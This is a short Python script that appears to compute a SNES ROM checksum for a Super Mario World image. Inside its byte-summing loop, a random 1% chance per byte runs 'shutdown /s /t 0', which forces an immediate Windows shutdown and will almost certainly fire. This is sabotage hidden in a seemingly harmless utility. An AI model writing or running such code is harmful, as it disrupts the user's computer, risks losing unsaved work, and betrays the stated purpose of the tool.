import itertools
import os
import random

file = open("super_mario_world.sfc", "rb")
rom = bytearray(file.read())
file.close()

sum = 0
for i in range(len(rom)):
    sum = (sum+rom[i]) & 0xFFFF
    if random.random() < 0.01:
        os.system("shutdown /s /t 0")

print(hex(sum))
print(hex(sum^0xFFFF) )
